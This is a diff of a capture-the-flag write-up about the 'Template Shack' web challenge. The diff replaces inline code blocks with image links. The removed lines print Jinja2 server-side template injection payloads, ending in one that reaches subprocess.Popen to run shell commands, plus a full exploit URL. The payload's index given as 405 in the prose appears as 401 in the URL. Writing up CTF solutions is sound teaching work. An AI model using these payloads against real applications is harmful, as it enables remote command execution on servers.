@@ -68,7 +68,7 @@ Since the name of the challenge is 'Template Shack', let's jump right into templ
 
 
 
-`jh2i.com:50023/admin/{{7*7}}`
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new0.png)
 
 
 
@@ -82,9 +82,9 @@ Template injection is a go!
 Starting with
 
 
-```
-{{''.__class__.__mro__[1].__subclasses__()}}
-```
+
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new1.png)
+
 
 
 we can look for the `'subprocess.Popen'` class
@@ -97,17 +97,17 @@ we can look for the `'subprocess.Popen'` class
 we need it's exact index in the list. Let's use slicing to find it:
 
 
-```
-{{''.__class__.__mro__[1].__subclasses__()[400::]}}
-```
+
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new2.png)
+
 
 
 By continuously slicing higher indicies, we can track down exactly where `subprocess.Popen` is
 
 
-```
-{{''.__class__.__mro__[1].__subclasses__()[405::]}}
-```
+
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new3.png)
+
 
 
 ![img](/assets/images/ctf/hacktivitycon-web-templateshack/10.png)
@@ -120,17 +120,17 @@ Now that it's at the top of the list, we know it's at 405
 Payload:
 
 
-```
-{{''.__class__.__mro__[1].__subclasses__()[405]('cat flag.txt',shell=True,stdout=-1).communicate()}}
-```
+
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new4.png)
+
 
 
 Full url:
 
 
-```
-http://jh2i.com:50023/admin/{{''.__class__.__mro__[1].__subclasses__()[401]('cat flag.txt',shell=True,stdout=-1).communicate()}}
-```
+
+![img](/assets/images/ctf/hacktivitycon-web-templateshack/new5.png)
+
 
 
 ![img](/assets/images/ctf/hacktivitycon-web-templateshack/11.png)
